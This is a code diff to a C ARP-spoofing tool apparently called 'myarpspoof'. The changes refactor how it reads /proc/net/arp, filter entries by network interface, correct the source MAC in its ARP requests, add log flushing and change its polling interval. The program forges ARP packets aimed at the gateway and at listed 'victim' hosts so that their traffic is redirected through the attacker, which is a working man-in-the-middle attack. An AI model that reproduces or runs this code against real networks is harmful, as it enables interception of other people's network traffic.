@@ -43,8 +43,9 @@ in_addr_t ip_of_eth;
 char g_strGateWayIP[IP4_LEN_STR_MAX_PLUS_NEW_LINE - 1];
 char g_strGateWayMAC[MAC_LEN_STR_MAX];
 char g_str_eth[16];
+FILE* fp_proc_net_arp;
 
-//#define TRACE(Arg...)	printf( Arg );printf( "\n" );
+//#define TRACE(Arg...)	printf( Arg );printf( "\n" );fflush(NULL);
 #define TRACE(Arg...)
 
 void LogMsg(char* pMsg)
@@ -56,6 +57,7 @@ void LogMsg(char* pMsg)
 	strftime(timestr, sizeof(timestr), "%Y.%m.%d-%T", &tm);
 
 	fprintf(stdout, "%s - %s\n", timestr, pMsg);
+	fflush(NULL);
 }
 
 void ReadIPsFromFile()
@@ -101,7 +103,7 @@ struct _arp_hdr
 
 void Create_and_Send_ARP_RequestFrame(const char* strIP_target)
 {
-	TRACE("Entered %s", __PRETTY_FUNCTION__);
+	TRACE("Create_and_Send_ARP_RequestFrame(const char* strIP_target=%s)", strIP_target);
 #define ETH_HDRLEN 14      // Ethernet header length
 #define IP4_HDRLEN 20      // IPv4 header length
 #define ARP_HDRLEN 28      // ARP header length
@@ -149,7 +151,7 @@ void Create_and_Send_ARP_RequestFrame(const char* strIP_target)
 
 	// Destination and Source MAC addresses
 	memset(ether_frame, 0xFF, 6 * sizeof(uint8_t));
-	memcpy(ether_frame + 6, g_strGateWayMAC, 6 * sizeof(uint8_t));
+	memcpy(ether_frame + 6, g_binMAC_of_eth, 6 * sizeof(uint8_t));
 
 	// Next is ethernet type code (ETH_P_ARP for ARP).
 	// http://www.iana.org/assignments/ethernet-numbers
@@ -171,9 +173,16 @@ void Create_and_Send_ARP_RequestFrame(const char* strIP_target)
 	TRACE("Leave %s", __PRETTY_FUNCTION__);
 }
 
-void CreateSockets()
+void CreateSocketsAndFiles()
 {
 	TRACE("Entered %s", __PRETTY_FUNCTION__);
+
+	if (!(fp_proc_net_arp = fopen("/proc/net/arp", "r")))
+	{
+		perror("error opening /proc/net/arp");
+		exit(EXIT_FAILURE);
+	}
+
 	if ((g_Raw_Socket = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
 	{
 		perror("socket() failed ");
@@ -225,10 +234,12 @@ void GetMAC_ofEth(const char* ifName, unsigned char* pMAC_Bin)
 	}
 	ip_of_eth = ((sockaddr_in*) &ifr.ifr_addr)->sin_addr.s_addr;
 	close(sd);
-	printf(
-			"Using net interface: %s, IP=%s, MAC=%02X:%02X:%02X:%02X:%02X:%02X\n",
+	char log_buf[200];
+	snprintf(log_buf, sizeof(log_buf)-1,
+			"Using net interface: %s, IP=%s, MAC=%02X:%02X:%02X:%02X:%02X:%02X",
 			ifName, inet_ntoa(*(in_addr*) &ip_of_eth), pMAC_Bin[0], pMAC_Bin[1],
 			pMAC_Bin[2], pMAC_Bin[3], pMAC_Bin[4], pMAC_Bin[5]);
+	LogMsg(log_buf);
 
 	TRACE("Leave %s", __PRETTY_FUNCTION__);
 }
@@ -344,86 +355,85 @@ void DoARP_Spoof()
 {
 	TRACE("Entered %s", __PRETTY_FUNCTION__);
 	char log_buf[200];
-	FILE* fp_proc_net_arp;
-	if ((fp_proc_net_arp = fopen("/proc/net/arp", "r")))
+
+	rewind(fp_proc_net_arp);
+	char strLine[200];
+	fgets(strLine, sizeof(strLine), fp_proc_net_arp); //skip header, first line
+	while (fgets(strLine, sizeof(strLine), fp_proc_net_arp))
 	{
-		char strLine[200];
-		fgets(strLine, sizeof(strLine), fp_proc_net_arp); //skip header, first line
-		while (fgets(strLine, sizeof(strLine), fp_proc_net_arp))
+		char tmp_ip[IP4_LEN_STR_MAX_PLUS_NEW_LINE];
+		char tmp_mac[MAC_LEN_STR_MAX];
+		char tmp_iface[17];
+
+		TRACE("Processing line: '%s'", strLine);
+		unsigned int arp_status_flag; //0x0 incomplete, 0x2 complete, 0x6 complete and manually set
+		if (4
+				!= sscanf(strLine, "%s %*s %x %s %*s %s\n", tmp_ip,
+						&arp_status_flag, tmp_mac, tmp_iface))
 		{
-			char tmp_ip[IP4_LEN_STR_MAX_PLUS_NEW_LINE];
-			char tmp_mac[MAC_LEN_STR_MAX];
-
-			TRACE("Processing line: '%s'", strLine);
-			unsigned int arp_status_flag; //0x0 incomplete, 0x2 complete, 0x6 complete and manually set
-			if (3
-					!= sscanf(strLine, "%s %*s %x %s %*s %*s\n", tmp_ip,
-							&arp_status_flag, tmp_mac))
+			perror("error parsing /proc/net/arp");
+			exit(2);
+		}
+		if(0 != strcmp(g_str_eth, tmp_iface))
+			continue;
+		for (unsigned i = 0; i < ui_IPsMacsCountRead; i++)
+		{
+			if (0 == strcmp(tmp_ip, IPsMacs[i].ip))
 			{
-				perror("error parsing /proc/net/arp");
-				exit(2);
-			}
-			for (unsigned i = 0; i < ui_IPsMacsCountRead; i++)
-			{
-				if (0 == strcmp(tmp_ip, IPsMacs[i].ip))
-				{
-					if (0
-							!= memcmp(tmp_mac, "00:00:00:00:00:00",
-									sizeof("00:00:00:00:00:00")))
-					{ //we have an entry
-
-						if (0x0 != arp_status_flag)
-						{ //current status of host is alive
-						  //MAC of IP changed
-							if (0 == IPsMacs[i].last_status)
+				if (0 != memcmp(tmp_mac, "00:00:00:00:00:00",
+								sizeof("00:00:00:00:00:00")))
+				{ //we have an entry
+					if (0x0 != arp_status_flag)
+					{ //current status of host is alive
+					  //MAC of IP changed
+						if (0 == IPsMacs[i].last_status)
+						{
+							if (0 != strcasecmp(tmp_mac, IPsMacs[i].mac))
 							{
-								if (0 != strcasecmp(tmp_mac, IPsMacs[i].mac))
-								{
-									snprintf(log_buf, sizeof(log_buf),
-											"%s -> %s", tmp_mac,
-											IPsMacs[i].ip);
-								}
-								else
-								{
-									snprintf(log_buf, sizeof(log_buf),
-											"%s -> %s (found again)", tmp_mac,
-											IPsMacs[i].ip);
-								}
-								LogMsg(log_buf);
-								strcpy(IPsMacs[i].mac, tmp_mac);
-								CreatePacketToGateway(&IPsMacs[i]);
-								CreatePacketToVictim(&IPsMacs[i]);
-								IPsMacs[i].last_status = 1;
+								snprintf(log_buf, sizeof(log_buf),
+										"%s -> %s", tmp_mac,
+										IPsMacs[i].ip);
 							}
 							else
 							{
-								if (0 != strcasecmp(tmp_mac, IPsMacs[i].mac))
-								{
-									snprintf(log_buf, sizeof(log_buf),
-											"%s leased to another device %s",
-											IPsMacs[i].ip, tmp_mac);
-									LogMsg(log_buf);
-								}
-								strcpy(IPsMacs[i].mac, tmp_mac);
+								snprintf(log_buf, sizeof(log_buf),
+										"%s -> %s (found again)", tmp_mac,
+										IPsMacs[i].ip);
 							}
-							DoARP_Spoof_Host(&IPsMacs[i]);
-						}//if (0x0 != arp_status_flag)
+							LogMsg(log_buf);
+							strcpy(IPsMacs[i].mac, tmp_mac);
+							CreatePacketToGateway(&IPsMacs[i]);
+							CreatePacketToVictim(&IPsMacs[i]);
+							IPsMacs[i].last_status = 1;
+						}
 						else
-						{//arp status incomplete
-							if (1 == IPsMacs[i].last_status)
+						{
+							if (0 != strcasecmp(tmp_mac, IPsMacs[i].mac))
 							{
 								snprintf(log_buf, sizeof(log_buf),
-										"%s is disappeared from %s", tmp_mac,
-										IPsMacs[i].ip);
+										"%s leased to another device %s",
+										IPsMacs[i].ip, tmp_mac);
 								LogMsg(log_buf);
-								IPsMacs[i].last_status = 0;
 							}
+							strcpy(IPsMacs[i].mac, tmp_mac);
 						}
-					}//memcmp(tmp_mac, "00:00:00:00:00:00",...
-				}//if (0 == strcmp(tmp_ip, IPsMacs[i].ip))
-			}//for (unsigned i = 0; i < ui_IPsMacsCountRead; i++)
-		}//while (fgets(strLine, sizeof(strLine), fp_proc_net_arp))
-	}//if ((fp_proc_net_arp = fopen("/proc/net/arp", "r")))
+						DoARP_Spoof_Host(&IPsMacs[i]);
+					}//if (0x0 != arp_status_flag)
+					else
+					{//arp status incomplete
+						if (1 == IPsMacs[i].last_status)
+						{
+							snprintf(log_buf, sizeof(log_buf),
+									"%s is disappeared from %s", tmp_mac,
+									IPsMacs[i].ip);
+							LogMsg(log_buf);
+							IPsMacs[i].last_status = 0;
+						}
+					}
+				}//memcmp(tmp_mac, "00:00:00:00:00:00",...
+			}//if (0 == strcmp(tmp_ip, IPsMacs[i].ip))
+		}//for (unsigned i = 0; i < ui_IPsMacsCountRead; i++)
+	}//while (fgets(strLine, sizeof(strLine), fp_proc_net_arp))
 	TRACE("Leave %s", __PRETTY_FUNCTION__);
 }
 
@@ -440,8 +450,7 @@ void ParseCmdLineParameters(int argc, char **argv)
 	TRACE("Entered %s", __PRETTY_FUNCTION__);
 	if (argc != 7)
 	{
-		fprintf(stderr, "Usage: %s -i eth0 -g 192.168.0.1 -m 10:FE:11:11:11:11\n",
-				argv[0]);
+		fprintf(stderr, "Usage: myarpspoof -i st2770.0 -g 192.168.0.1 -m 10:fe:ed:e5:c2:b4\n");
 		exit(EXIT_FAILURE);
 	}
 	int opt;
@@ -487,14 +496,14 @@ int main(int argc, char* argv[])
 {
 	ParseCmdLineParameters(argc, argv);
 
-	CreateSockets();
+	CreateSocketsAndFiles();
 	ReadIPsFromFile();
 	GetMAC_ofEth(g_str_eth, g_binMAC_of_eth);
 
 	while (1)
 	{
 		SendARP_Requests();
-		sleep(2);
+		sleep(5);
 		DoARP_Spoof();
 	}
 	return 0;
